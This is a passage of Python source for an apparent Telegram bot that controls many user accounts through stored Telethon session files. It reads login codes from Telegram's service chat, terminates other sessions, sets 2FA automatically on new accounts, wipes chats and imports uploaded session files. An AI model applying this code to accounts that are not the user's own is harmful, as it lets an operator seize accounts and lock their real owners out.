        InlineKeyboardButton("✅ Yes, Logout", callback_data=f"delete_{phone_number}"),
        InlineKeyboardButton("❌ No", callback_data=f"manage_{phone_number}")
    ]]
    await safe_edit_or_reply(update, context, 
        text=f"❓ Are you sure you want to log out from {phone_number}?",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def confirm_delete_all_chats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    callback_data_parts = query.data.split("_")
    # Adjusted index for phone_number based on new callback_data format
    if len(callback_data_parts) == 5 and re.fullmatch(PHONE_NUMBER_REGEX, callback_data_parts[4]):
        phone_number = callback_data_parts[4]    
    else:
        logger.error(f"Invalid callback_data format for confirm_delete_all_chats_callback: {query.data}")
        await safe_edit_or_reply(update, context, "An internal error occurred: Invalid data for chat deletion.")
        await manage_accounts(update, context)
        return

    context.user_data['phone_to_clear_history'] = phone_number # Store for next step

    keyboard = [
        [InlineKeyboardButton("🔴 Confirm, Delete All Chats & Leave Groups", callback_data=f"delete_all_chats_confirmed_{phone_number}")],
        [InlineKeyboardButton("« Back to Account Menu", callback_data=f"manage_{phone_number}")]
    ]
    await safe_edit_or_reply(update, context, 
        text=f"⚠️ **WARNING!** Are you absolutely sure you want to delete ALL chat history for account `{phone_number}` and **leave all groups**?\n\n**This action is irreversible!**",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


async def delete_all_chat_history_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user_data = read_user_data(user_id)
    current_folder = user_data.get('current_folder', 'Default')
    phone_number = context.user_data.get('phone_to_clear_history') # Retrieve from context

    if not phone_number:
        logger.error("Phone number not found in context for delete_all_chat_history_callback.")
        await safe_edit_or_reply(update, context, "An internal error occurred: Could not determine account for chat deletion.")
        await manage_accounts(update, context)
        return

    session_path = get_session_path(user_id, phone_number)

    await safe_edit_or_reply(update, context, f"Starting to delete all chat history and leave groups for _{phone_number}_. This may take some time...", parse_mode='Markdown')

    client = create_client(session_path)
    deleted_dialogs_count = 0
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await safe_edit_or_reply(update, context, "Session is invalid. Cannot delete chats.")
            if os.path.exists(session_path): os.remove(session_path)
            remove_account_info(user_id, phone_number, current_folder) # Pass current_folder
            return

        async for dialog in client.iter_dialogs():
            try:
                if isinstance(dialog.entity, User):
                    await client(DeleteHistoryRequest(
                        peer=dialog.entity,
                        max_id=0,
                        just_clear=False,
                        revoke=True
                    ))
                    logger.info(f"Deleted private chat history with {dialog.name} for {phone_number}")
                    deleted_dialogs_count += 1
                elif isinstance(dialog.entity, (Channel, Chat)):
                    await client.delete_dialog(dialog.entity, revoke=True)
                    logger.info(f"Left and deleted chat history for group/channel {dialog.name} for {phone_number}")
                    deleted_dialogs_count += 1
                await asyncio.sleep(0.1) # Changed from 0.5 to 0.1 for faster execution
            except FloodWaitError as fwe:
                logger.warning(f"Flood wait of {fwe.seconds}s encountered for {phone_number}. Waiting...")
                await safe_edit_or_reply(update, context, f"Flood wait encountered. Waiting for {fwe.seconds} seconds before continuing chat deletion and leaving groups for `{phone_number}`...", parse_mode='Markdown')
                await asyncio.sleep(fwe.seconds + 5)
            except Exception as e:
                logger.error(f"Error deleting/leaving dialog {dialog.name} ({dialog.id}) for {phone_number}: {e}")
                continue    

        await safe_edit_or_reply(update, context, f"✅ Finished deleting chat history and leaving groups for `{phone_number}`. Deleted history/left {deleted_dialogs_count} chats/groups.")

    except Exception as e:
        logger.error(f"Overall error in delete_all_chat_history_callback for {phone_number}: {e}")
        await safe_edit_or_reply(update, context, f"An error occurred while deleting chat history and leaving groups: {e}")
    finally:
        if client.is_connected(): await client.disconnect()
        await manage_account_callback(update, context)
    return ConversationHandler.END

# Removed check_groups_channels_callback as per user request

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    # Fixed: Removed extra ')' from callback_data parsing
    phone_number = query.data.split("_")[1]
    session_path = get_session_path(user_id, phone_number)
    
    await safe_edit_or_reply(update, context, f"Fetching login code for {phone_number}...")

    client = create_client(session_path)
    login_code = "Not found"
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await safe_edit_or_reply(update, context, "Session is invalid. Removing this invalid session from your list.")
            if os.path.exists(session_path): os.remove(session_path)
            user_data = read_user_data(user_id)
            current_folder = user_data.get('current_folder', 'Default')
            remove_account_info(user_id, phone_number, current_folder) # Pass current_folder
            return

        async for message in client.iter_messages(777000, limit=100):
            if not message.text:
                continue
            match = re.search(r'\b(\d{5,})\b', message.text)    
            if match:
                login_code = match.group(1)
                break
    except Exception as e:
        logger.error(f"Error in stats callback for {phone_number}: {e}")
        await safe_edit_or_reply(update, context, f"An error occurred: {e}")
    finally:
        if client.is_connected(): await client.disconnect()
    stats_message = f"🔑 **Latest Login Code for {phone_number}**\n\n▫️ **Code:** `{login_code}`"
    keyboard_back = [[InlineKeyboardButton("« Back to Manage", callback_data=f"manage_{phone_number}")]]
    await safe_edit_or_reply(update, context, stats_message, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard_back))
    return ConversationHandler.END

async def _fetch_and_display_sessions_task(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str, chat_id: int, message_id: int) -> None:
    """
    Background task to fetch active sessions and update the message.
    """
    user_id = update.effective_user.id
    session_path = get_session_path(user_id, phone_number)
    client = create_client(session_path)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text="Session is invalid. Removing it."
            )
            if os.path.exists(session_path): os.remove(session_path)
            user_data = read_user_data(user_id)
            current_folder = user_data.get('current_folder', 'Default')
            remove_account_info(user_id, phone_number, current_folder) # Pass current_folder
            return
        
        authorizations_response = await client(GetAuthorizationsRequest())
        result = authorizations_response
        
        keyboard = []
        text = "<b>Active Sessions:</b>\n\n"
        has_other_sessions = False
        for auth in result.authorizations:
            is_current = "(Your device)" if auth.current else ""
            text += f"▪️ <b>{auth.app_name}</b> on {auth.device_model} {is_current}\n"
            text += f"    <pre>IP: {auth.ip} | Country: {auth.country}</pre>\n"
            if not auth.current:
                has_other_sessions = True
                keyboard.append([InlineKeyboardButton(f"Terminate {auth.device_model}", callback_data=f"terminate_{phone_number}_{auth.hash}")])
        
        if has_other_sessions:
            keyboard.append([InlineKeyboardButton("🔴 Terminate All Other Sessions", callback_data=f"logout_all_others_{phone_number}")])
        
        keyboard.append([InlineKeyboardButton("« Back to Manage", callback_data=f"manage_{phone_number}")])
        
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=message_id,
            text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML'
        )

    except Exception as e:
        logger.error(f"Error fetching active sessions for {phone_number} in background task: {e}")
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=message_id,
            text=f"An error occurred while fetching sessions: {e}"
        )
    finally:
        if client.is_connected(): await client.disconnect()


async def active_sessions_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    
    phone_number = None
    if query:
        phone_number = query.data.split("_")[1]
    elif update.message:
        phone_number = context.user_data.get('current_managing_phone')

    if not phone_number:
        logger.error("Phone number not found for active_sessions_callback.")
        await safe_edit_or_reply(update, context, "Could not determine account. Please try again from Manage Accounts.")
        return

    # Send initial "Fetching..." message
    initial_message = await safe_edit_or_reply(update, context, f"Fetching active sessions for {phone_number}...")
    
    if not initial_message:
        logger.error("Failed to send initial message for active sessions.")
        return

    chat_id = initial_message.chat_id
    message_id = initial_message.message_id

    # Spawn a new task to perform the long-running operation
    asyncio.create_task(
        _fetch_and_display_sessions_task(update, context, phone_number, chat_id, message_id)
    )
    
    # Immediately answer the callback query to remove the loading spinner
    if query:
        await query.answer()

    # The handler finishes here, allowing other updates to be processed.
    # The actual session data will be sent by the background task.


async def terminate_session_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    _, phone_number, session_hash_str = query.data.split("_")
    session_hash = int(session_hash_str)
    
    await safe_edit_or_reply(update, context, "Terminating session... Please wait.")
    
    client = create_client(get_session_path(user_id, phone_number))
    try:
        await client.connect()
        if await client.is_user_authorized():
            await client(ResetAuthorizationRequest(hash=session_hash))
            await query.message.reply_text("Session terminated successfully!")    
        
        # Re-fetch and display sessions after termination
        await active_sessions_callback(update, context) # Changed to call active_sessions_callback directly
                                                        # to leverage its non-blocking behavior
    except RPCError as e:
        if "AUTH_UNREGISTERED" in str(e):
            logger.error(f"AuthKeyUnregisteredError during session termination for {phone_number}: {e}")
            await safe_edit_or_reply(update, context, "Session is unregistered/invalid. Please re-add the account.", parse_mode='Markdown')
            user_data = read_user_data(user_id)
            current_folder = user_data.get('current_folder', 'Default')
            remove_account_info(user_id, phone_number, current_folder) # Pass current_folder
        elif "FROZEN_METHOD_INVALID" in str(e):
            logger.warning(f"FROZEN_METHOD_INVALID for {phone_number} during session termination: {e}")
            await safe_edit_or_reply(update, context, f"❌ Account `{phone_number}` is restricted by Telegram. Cannot terminate sessions. Please check the account manually in the official app.", parse_mode='Markdown')
        else:
            logger.error(f"RPCError terminating session for {phone_number}: {e}")
            await safe_edit_or_reply(update, context, f"An API error occurred during termination: {e}")
    except Exception as e:
        logger.error(f"Error terminating session for {phone_number}: {e}")
        await safe_edit_or_reply(update, context, f"An error occurred during termination: {e}")
    finally:
        if client.is_connected(): await client.disconnect()
    # No return ConversationHandler.END here, as active_sessions_callback handles the follow-up message.


async def logout_all_others_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    phone_number = query.data.split("_")[3]

    await safe_edit_or_reply(update, context, f"Terminating all other sessions for {phone_number} (keeping this one)... Please wait.")

    client = create_client(get_session_path(user_id, phone_number))
    try:
        await client.connect()
        if await client.is_user_authorized():
            authorizations = await client(GetAuthorizationsRequest())
            terminated_count = 0
            for auth in authorizations.authorizations:
                if not auth.current:    
                    try:
                        await client(ResetAuthorizationRequest(hash=auth.hash))    
                        terminated_count += 1
                        await asyncio.sleep(0.5)
                    except RPCError as e:
                        logger.warning(f"Could not terminate session {auth.hash} for {phone_number}: {e}")
                    except Exception as e:
                        logger.error(f"Unexpected error terminating session {auth.hash} for {phone_number}: {e}")
            
            if terminated_count > 0:
                await query.message.reply_text(f"✅ Successfully terminated {terminated_count} other sessions for {phone_number}!")
            else:
                await query.message.reply_text(f"No other active sessions found to terminate for {phone_number}.")
        else:
            await safe_edit_or_reply(update, context, "Session is invalid or already logged out. Please re-add the account.")
            user_data = read_user_data(user_id)
            current_folder = user_data.get('current_folder', 'Default')
            remove_account_info(user_id, phone_number, current_folder) # Pass current_folder
            
        # Re-fetch and display sessions after termination
        await active_sessions_callback(update, context) # Changed to call active_sessions_callback directly
                                                        # to leverage its non-blocking behavior

    except RPCError as e:
        if "AUTH_UNREGISTERED" in str(e):
            logger.error(f"AuthKeyUnregisteredError during session termination for {phone_number}: {e}")
            await safe_edit_or_reply(update, context, "Session is unregistered/invalid. Please re-add the account.", parse_mode='Markdown')
            user_data = read_user_data(user_id)
            current_folder = user_data.get('current_folder', 'Default')
            remove_account_info(user_id, phone_number, current_folder) # Pass current_folder
        elif "FROZEN_METHOD_INVALID" in str(e):
            logger.warning(f"FROZEN_METHOD_INVALID for {phone_number} during session termination: {e}")
            await safe_edit_or_reply(update, context, f"❌ Account `{phone_number}` is restricted by Telegram. Cannot terminate sessions. Please check the account manually in the official app.", parse_mode='Markdown')
        else:
            logger.error(f"RPCError during logout all others for {phone_number}: {e}")
            await safe_edit_or_reply(update, context, f"An API error occurred while trying to terminate other sessions: {e}")
    except Exception as e:
        logger.error(f"Error during logout all others for {phone_number}: {e}")
        await safe_edit_or_reply(update, context, f"An error occurred while trying to terminate other sessions: {e}")
    finally:
        if client.is_connected(): await client.disconnect()
    # No return ConversationHandler.END here, as active_sessions_callback handles the follow-up message.


async def tfa_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    phone_number = query.data.split("_")[2]
    context.user_data['tfa_phone'] = phone_number
    session_path = get_session_path(user_id, phone_number)
    
    await safe_edit_or_reply(update, context, f"Checking 2FA status for {phone_number}...")
    
    client = create_client(session_path)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await safe_edit_or_reply(update, context, "Session is invalid.")
            return

        password_info = await client(GetPasswordRequest())
        
        keyboard = []
        if not password_info.has_password:
            text = "Two-Step Verification is currently <b>OFF</b>."
            keyboard.append([InlineKeyboardButton("🔒 Enable 2FA", callback_data=f"tfa_enable_{phone_number}")])
        else:
            text = "Two-Step Verification is currently <b>ON</b>."
            keyboard.append([InlineKeyboardButton("❌ Disable 2FA", callback_data=f"tfa_disable_start_{phone_number}")])

        keyboard.append([InlineKeyboardButton("« Back to Manage", callback_data=f"manage_{phone_number}")])
        await safe_edit_or_reply(update, context, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    except Exception as e:
        logger.error(f"Error fetching 2FA status for {phone_number}: {e}")
        await safe_edit_or_reply(update, context, f"An error occurred: {e}")
    finally:
        if client.is_connected(): await client.disconnect()
    return ConversationHandler.END

async def tfa_enable_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    phone_number = query.data.split("_")[2]
    context.user_data['tfa_phone'] = phone_number
    await safe_edit_or_reply(update, context, "Please send the new password for your Two-Step Verification.")
    return TFA_NEW_PASSWORD

async def tfa_new_password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text
    context.user_data['tfa_password'] = password
    await update.message.reply_text("Great! Now send a hint for your password (optional, send '-' for no hint).")
    return TFA_HINT

async def tfa_hint_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    hint = update.message.text
    password_str = context.user_data['tfa_password']
    phone_number = context.user_data['tfa_phone']
    session_path = get_session_path(user_id, phone_number)
    
    final_hint = hint if hint != '-' else None
    
    await update.message.reply_text("Setting up 2FA... Please wait.")
    
    client = create_client(session_path)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.message.reply_text("Session is invalid. Please add the account again.")
            return ConversationHandler.END
            
        await client.edit_2fa(new_password=password_str, hint=final_hint)
        await update.message.reply_text("✅ Two-Step Verification has been successfully enabled!")
    except RPCError as e:
        if "PASSWORD_HASH_INVALID" in str(e):
            await update.message.reply_text("❌ Incorrect 2FA password. Please try again or /cancel.")
            return TFA_HINT
        elif "FROZEN_METHOD_INVALID" in str(e):
            logger.warning(f"FROZEN_METHOD_INVALID for {phone_number} during 2FA enable: {e}")
            await update.message.reply_text(f"❌ Account `{phone_number}` is restricted by Telegram. Cannot enable 2FA. Please check the account manually in the official app.", parse_mode='Markdown')
        else:
            logger.error(f"RPC Error enabling 2FA for {phone_number}: {e}")
            await update.message.reply_text(f"An API error occurred: {e}.")
    except Exception as e:
        logger.error(f"Error enabling 2FA for {phone_number}: {e}")
        await update.message.reply_text(f"An error occurred: {e}")
    finally:
        if client.is_connected(): await client.disconnect()
        return ConversationHandler.END


async def tfa_disable_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    phone_number = query.data.split("_")[3]
    context.user_data['tfa_phone_to_disable'] = phone_number
    await safe_edit_or_reply(update, context, "To disable Two-Step Verification, please enter your current 2FA password.")
    return TFA_DISABLE_PASSWORD

async def tfa_disable_password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    current_password = update.message.text
    phone_number = context.user_data.get('tfa_phone_to_disable')
    user_id = update.message.from_user.id
    session_path = get_session_path(user_id, phone_number)
    
    await update.message.reply_text(f"Attempting to disable 2FA for {phone_number}... Please wait.")
    
    client = create_client(session_path)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await update.message.reply_text("Session is invalid. Please add the account again.")
            return ConversationHandler.END

        await client.edit_2fa(current_password=current_password, new_password=None)
        await update.message.reply_text("✅ Two-Step Verification has been successfully disabled!")

    except RPCError as e:
        if "PASSWORD_HASH_INVALID" in str(e):
            await update.message.reply_text("❌ Incorrect 2FA password. Please try again or /cancel.")
            return TFA_DISABLE_PASSWORD
        elif "FROZEN_METHOD_INVALID" in str(e):
            logger.warning(f"FROZEN_METHOD_INVALID for {phone_number} during 2FA disable: {e}")
            await update.message.reply_text(f"❌ Account `{phone_number}` is restricted by Telegram. Cannot disable 2FA. Please check the account manually in the official app.", parse_mode='Markdown')
        else:
            logger.error(f"RPC Error disabling 2FA for {phone_number}: {e}")
            await update.message.reply_text(f"An API error occurred: {e}.")
    except Exception as e:
        logger.error(f"Unexpected Error disabling 2FA for {phone_number}: {e}")
        await update.message.reply_text(f"An unexpected error occurred: {e}")
    finally:
        if client.is_connected(): await client.disconnect()
        return ConversationHandler.END
        
# Removed email_menu_callback, email_start_conv, email_password_handler, email_new_email_handler, email_confirm_code_handler as per user request

# --- Auto 2FA Settings Functions ---

async def auto_2fa_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    user_data = read_user_data(user_id)
    auto_2fa_enabled = user_data.get('auto_2fa_enabled', False)
    auto_2fa_hint = user_data.get('auto_2fa_hint')
    auto_2fa_remaining_count = user_data.get('auto_2fa_remaining_count', 0)

    status_text = "Enabled" if auto_2fa_enabled else "Disabled"
    hint_text = auto_2fa_hint if auto_2fa_hint else "Not set"
    count_text = f" ({auto_2fa_remaining_count} accounts remaining)" if auto_2fa_enabled and auto_2fa_remaining_count > 0 else ""

    keyboard = []
    if auto_2fa_enabled:
        keyboard.append([InlineKeyboardButton("❌ Disable Auto 2FA", callback_data="auto_2fa_disable")])
    else:
        keyboard.append([InlineKeyboardButton("✅ Enable Auto 2FA", callback_data="auto_2fa_enable_start")])
    
    keyboard.append([InlineKeyboardButton("📝 Set Default 2FA Hint", callback_data="auto_2fa_set_hint")])
    keyboard.append([InlineKeyboardButton("« Back to Main Menu", callback_data="back_to_start")])

    text = (
        f"<b>Auto 2FA Settings</b>\n\n"
        f"Current Status: <b>{status_text}{count_text}</b>\n"
        f"Default Hint: <code>{hint_text}</code>\n\n"
        "If Auto 2FA is enabled, it will automatically set up 2FA on new accounts upon login if 2FA is not already set, using your configured password and hint. It will stop after the set number of accounts."
    )
    
    await safe_edit_or_reply(update, context, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    
    return AUTO_2FA_MENU

async def auto_2fa_enable_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    await safe_edit_or_reply(update, context, 
        "To enable Auto 2FA, please send the password you want to use for automatically setting up 2FA on new accounts.\n\n"
        "This will only be used temporarily and will not be stored permanently. Send /cancel to abort."
    )
    return AUTO_2FA_SET_PASSWORD

async def auto_2fa_password_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text
    context.user_data['temp_auto_2fa_password'] = password
    
    await update.message.reply_text("Great! Now, how many new accounts do you want to apply Auto 2FA to? Please send a number.")
    return AUTO_2FA_SET_COUNT

async def auto_2fa_count_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    try:
        count = int(update.message.text.strip())
        if count <= 0:
            await update.message.reply_text("Please enter a positive number. Try again or /cancel.")
            return AUTO_2FA_SET_COUNT
    except ValueError:
        await update.message.reply_text("Invalid input. Please enter a valid number. Try again or /cancel.")
        return AUTO_2FA_SET_COUNT

    user_data = read_user_data(user_id)
    user_data['auto_2fa_enabled'] = True
    user_data['auto_2fa_remaining_count'] = count
    write_user_data(user_id, user_data)

    await update.message.reply_text(f"Auto 2FA enabled for the next {count} accounts. It will use the password you just provided.")
    await auto_2fa_settings_menu(update, context)
    return ConversationHandler.END


async def auto_2fa_set_hint(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logger.info("auto_2fa_set_hint function called via callback.")
    query = update.callback_query
    await query.answer()
    await safe_edit_or_reply(update, context, 
        "Send your default 2FA hint (optional, send '-' for no hint). \n\n"
        "Send /cancel to abort."
    )
    return AUTO_2FA_SET_HINT

async def auto_2fa_hint_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    hint = update.message.text
    final_hint = hint if hint != '-' else None

    user_data = read_user_data(user_id)
    user_data['auto_2fa_hint'] = final_hint
    write_user_data(user_id, user_data)

    await update.message.reply_text("Default 2FA hint successfully set.")
    await auto_2fa_settings_menu(update, context)
    return ConversationHandler.END

async def auto_2fa_disable(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    user_data = read_user_data(user_id)
    user_data['auto_2fa_enabled'] = False
    user_data['auto_2fa_remaining_count'] = 0
    write_user_data(user_id, user_data)

    if 'temp_auto_2fa_password' in context.user_data:
        del context.user_data['temp_auto_2fa_password']

    await safe_edit_or_reply(update, context, "Auto 2FA successfully disabled.")
    await auto_2fa_settings_menu(update, context)
    return ConversationHandler.END

# --- Auto Name Settings Functions ---
async def auto_name_settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    user_data = read_user_data(user_id)
    auto_name = user_data.get('auto_name')

    name_status_text = auto_name if auto_name else "Not set"

    keyboard = [
        [InlineKeyboardButton("✏️ Set Auto Name", callback_data="auto_name_set_start")],
    ]
    if auto_name:
        keyboard.append([InlineKeyboardButton("🗑️ Clear Auto Name", callback_data="auto_name_clear")])
    keyboard.append([InlineKeyboardButton("« Back to Main Menu", callback_data="back_to_start")])

    text = (
        f"<b>Auto Name Settings</b>\n\n"
        f"Current Auto Name: <code>{name_status_text}</code>\n\n"
        "If an Auto Name is set, it will automatically apply this name to new accounts upon successful login. Note that this will *overwrite* any existing name on the account."
    )
    
    await safe_edit_or_reply(update, context, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    
    return AUTO_NAME_SET

async def auto_name_set_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    await safe_edit_or_reply(update, context,
        "Please send the name you want to automatically set for new accounts.\n\n"
        "Send /cancel to abort."
    )
    return AUTO_NAME_SET

async def auto_name_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    new_name = update.message.text.strip()

    if not new_name:
        await update.message.reply_text("Name cannot be empty. Please send a valid name or /cancel.")
        return AUTO_NAME_SET

    user_data = read_user_data(user_id)
    user_data['auto_name'] = new_name
    write_user_data(user_id, user_data)

    await update.message.reply_text(f"Auto Name successfully set to: <code>{new_name}</code>")
    await auto_name_settings_menu(update, context)
    return ConversationHandler.END

async def auto_name_clear(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    user_data = read_user_data(user_id)
    user_data['auto_name'] = None
    write_user_data(user_id, user_data)

    await safe_edit_or_reply(update, context, "Auto Name successfully cleared.")
    await auto_name_settings_menu(update, context)
    return ConversationHandler.END

# --- New Folder Management Functions ---
async def my_folders_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    user_data = read_user_data(user_id)
    folders = user_data.get('folders', {})
    current_folder = user_data.get('current_folder', 'Default')

    keyboard = []
    total_accounts_in_all_folders = 0

    # Sort folders alphabetically, with 'Default' always first
    sorted_folder_names = sorted(folders.keys())
    if "Default" in sorted_folder_names:
        sorted_folder_names.remove("Default")
        sorted_folder_names.insert(0, "Default")

    for folder_name in sorted_folder_names:
        accounts_in_folder = folders[folder_name].get('accounts', {})
        num_accounts = len(accounts_in_folder)
        total_accounts_in_all_folders += num_accounts
        
        selected_indicator = "(Selected)" if folder_name == current_folder else ""
        button_text = f"🗂️ {folder_name} {selected_indicator} ({num_accounts} accounts)"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"select_folder_{folder_name}")])
    
    keyboard.append([InlineKeyboardButton("➕ Create New Folder", callback_data="create_new_folder")])
    keyboard.append([InlineKeyboardButton("« Back to Main Menu", callback_data="back_to_start")])

    text = f"<b>Your Account Folders:</b>\n\nSelect a folder to view its accounts, or create a new one.\n\nTotal Accounts Across All Folders: {total_accounts_in_all_folders}"
    await safe_edit_or_reply(update, context, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    return FOLDER_MENU

async def create_new_folder_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    await safe_edit_or_reply(update, context, "Please send the name for the new folder. Send /cancel to abort.")
    return CREATE_FOLDER_NAME

async def create_folder_name_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    new_folder_name = update.message.text.strip()

    if not new_folder_name:
        await update.message.reply_text("Folder name cannot be empty. Please send a valid name or /cancel.")
        return CREATE_FOLDER_NAME

    user_data = read_user_data(user_id)
    if new_folder_name in user_data['folders']:
        await update.message.reply_text(f"Folder '{new_folder_name}' already exists. Please choose a different name or /cancel.")
        return CREATE_FOLDER_NAME
    
    user_data['folders'][new_folder_name] = {"accounts": {}}
    user_data['current_folder'] = new_folder_name # Automatically select the new folder
    write_user_data(user_id, user_data)

    await update.message.reply_text(f"Folder '{new_folder_name}' created and selected as current folder.")
    await my_folders_menu(update, context) # Go back to folder menu
    return ConversationHandler.END

async def select_folder_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    selected_folder_name = query.data.split("_")[2] # e.g., "select_folder_MyFolder"

    user_data = read_user_data(user_id)
    if selected_folder_name in user_data['folders']:
        user_data['current_folder'] = selected_folder_name
        write_user_data(user_id, user_data)
        await safe_edit_or_reply(update, context, f"Folder **{selected_folder_name}** selected as current. All new accounts will be saved here.", parse_mode='Markdown')
        await start(update, context) # Go back to main menu
    else:
        await safe_edit_or_reply(update, context, "Selected folder not found. Please try again.")
    return ConversationHandler.END

async def my_accounts_summary(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_data = read_user_data(user_id)
    folders = user_data.get('folders', {})
    total_accounts = 0
    accounts_per_folder_summary = []

    # Sort folders alphabetically, with 'Default' always first
    sorted_folder_names = sorted(folders.keys())
    if "Default" in sorted_folder_names:
        sorted_folder_names.remove("Default")
        sorted_folder_names.insert(0, "Default")

    for folder_name in sorted_folder_names:
        accounts_in_folder = folders[folder_name].get('accounts', {})
        num_accounts = len(accounts_in_folder)
        total_accounts += num_accounts
        accounts_per_folder_summary.append(f"▪️ <b>{folder_name}</b>: {num_accounts} accounts")

    summary_text = f"<b>Your Account Summary:</b>\n\nTotal Accounts: <b>{total_accounts}</b>\n\n"
    if accounts_per_folder_summary:
        summary_text += "<b>Accounts per Folder:</b>\n" + "\n".join(accounts_per_folder_summary)
    else:
        summary_text += "No accounts added yet."

    keyboard = [[InlineKeyboardButton("« Back to Main Menu", callback_data="back_to_start")]]
    await safe_edit_or_reply(update, context, summary_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# --- New Function: To handle direct phone number input as a conversation entry ---
async def direct_phone_number_entry(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    return await phone_number_handler(update, context)

# --- New Add Session Functions ---
async def add_session_file_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await safe_edit_or_reply(update, context, "Please send the `.session` file you want to add. Make sure it's a valid Telethon session file. Send /cancel to abort.", reply_markup=ReplyKeyboardRemove())
    return ADD_SESSION_FILE

async def _process_session_file_task(update: Update, context: ContextTypes.DEFAULT_TYPE, session_file_path_temp: str, chat_id: int, message_id: int | None) -> None:
    """
    Background task to process the uploaded session file and add the account.
    """
    user_id = update.effective_user.id
    client = None
    phone_number = None
    user_name = update.effective_user.first_name # Use bot user's name for now
    user_data = read_user_data(user_id)
    current_folder = user_data.get('current_folder', 'Default')

    try:
        client = TelegramClient(session_file_path_temp, API_ID, API_HASH)
        await client.connect()
        if not await client.is_user_authorized():
            final_text = "The provided session file is invalid or expired. Please try again with a valid session file."
            return
        
        me = await client.get_me()
        phone_number = me.phone
        if not phone_number:
            final_text = "Could not retrieve phone number from the session file. Please ensure it's a valid user session."
            return

        await client.disconnect()

        # Move the session file to its final destination
        final_session_path = get_session_path(user_id, "+" + phone_number) # Ensure phone number is always with '+'
        try:
            if os.path.exists(final_session_path):
                os.remove(final_session_path) # Remove old session file if exists
            os.rename(session_file_path_temp, final_session_path)
            logger.info(f"Moved session file from {session_file_path_temp} to {final_session_path}")
        except Exception as e:
            logger.error(f"Error moving session file: {e}")
            final_text = f"Failed to save session file: {e}. Please try again."
            return

        # Save account info to user data in the current folder
        save_account_info(user_id, user_name, "+" + phone_number, is_frozen=False, folder_name=current_folder)

        final_text = f"Account **+{phone_number}** successfully added to folder **{current_folder}**!"
    except Exception as e:
        logger.error(f"Error processing session file in background task: {e}")
        final_text = f"An error occurred while processing the session file: {e}. Please try again."
    finally:
        if client and client.is_connected():
            await client.disconnect()
        if os.path.exists(session_file_path_temp):
            try:
                os.remove(session_file_path_temp)
            except OSError as e:
                logger.error(f"Error cleaning up temporary session file {session_file_path_temp}: {e}")
        
        # Send or edit the final message
        if message_id:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text=final_text, parse_mode='Markdown' # Ensure markdown is parsed
            )
        else: # If no message_id, send a new message
            await context.bot.send_message(
